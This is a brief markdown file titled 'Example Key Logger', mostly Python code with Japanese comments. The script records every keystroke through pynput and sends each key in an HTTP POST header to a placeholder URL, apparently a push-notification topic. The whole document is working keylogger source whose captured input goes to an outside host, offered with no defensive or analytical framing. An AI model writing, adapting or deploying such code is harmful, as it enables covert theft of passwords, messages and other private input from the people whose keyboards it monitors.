# TEST
Example Key Logger
```py
import requests
from pynput import keyboard

# あなたの専用トピックURL
url = "<URL HERE>"
            
def on_press(key):
    try:
        # 押されたキーを出力
        print(f'アルファベット入力: {key.char}')
        key_a = key.char
    except AttributeError:
        # 特殊キー（EnterやShiftなど）の場合
        print(f'特殊キー入力: {key}')
        key_a = key
    # curl -d "Hi" と同じ設定（テキストデータをPOSTする）
    headers = {
        "Title": str(key_a), # 通知のタイトル（任意）
    }
    response = requests.post(url, data="Push Key", headers=headers, timeout=5)

# キーボードの監視を開始
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
